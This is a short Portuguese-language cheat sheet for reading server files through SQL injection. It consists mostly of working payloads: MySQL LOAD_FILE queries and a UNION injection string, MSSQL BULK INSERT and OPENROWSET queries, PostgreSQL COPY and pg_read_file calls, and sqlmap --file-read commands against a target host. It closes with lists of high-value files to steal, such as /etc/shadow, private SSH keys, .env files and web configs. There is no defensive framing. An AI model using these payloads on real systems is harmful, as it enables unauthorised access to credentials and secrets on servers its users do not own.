# Leitura de Arquivos via SQL Injection

## MySQL — LOAD_FILE

### Pré-requisitos
- Privilégio `FILE`
- `secure_file_priv` = "" ou apontando para o arquivo
- Arquivo deve ser legível pelo usuário do MySQL

```sql
-- Verificar privilégio FILE
SELECT file_priv FROM mysql.user WHERE user = CURRENT_USER();

-- Verificar secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- Ler arquivo
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/config.php');
SELECT LOAD_FILE('C:\\windows\\win.ini');
```

### Via UNION
```sql
' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--
```

## MSSQL — BULK INSERT / OPENROWSET

```sql
-- Ler arquivo via BULK INSERT
CREATE TABLE #arquivo (conteudo varchar(8000));
BULK INSERT #arquivo FROM 'C:\windows\win.ini';
SELECT * FROM #arquivo;

-- OPENROWSET (requer linked server)
SELECT * FROM OPENROWSET(BULK 'C:\windows\win.ini', SINGLE_CLOB) AS conteudo;
```

## PostgreSQL — COPY FROM

```sql
-- Ler /etc/passwd
COPY passwords FROM '/etc/passwd';
SELECT * FROM passwords;

-- Sem criar tabela
SELECT pg_read_file('/etc/passwd');  -- requer superuser
```

## Com SQLMap

```bash
# Ler arquivo do servidor
sqlmap -u "http://alvo.com/?id=1" \
  --file-read="/etc/passwd" \
  --batch

# Windows
sqlmap -u "http://alvo.com/?id=1" \
  --file-read="C:\\inetpub\\wwwroot\\web.config" \
  --batch

# Arquivo salvo localmente em:
# ~/.sqlmap/output/alvo.com/files/_etc_passwd
```

## Arquivos de Alto Valor

### Linux
```
/etc/passwd                    # Usuários do sistema
/etc/shadow                    # Hashes de senhas (requer root)
/etc/hosts                     # Mapeamento de hosts
/etc/mysql/my.cnf              # Config MySQL
/var/www/html/config.php       # Config da aplicação
/var/www/html/wp-config.php    # WordPress config
/.env                          # Variáveis de ambiente
/home/usuario/.ssh/id_rsa      # Chave SSH privada
/proc/version                  # Versão do kernel
```

### Windows
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\phpMyAdmin\config.inc.php
C:\Program Files\MySQL\MySQL Server\my.ini
```

### PHP Config Files
```
/var/www/html/config.php
/var/www/html/includes/db.php
/var/www/html/application/config/database.php
/var/www/html/wp-config.php
/var/www/html/.env
```
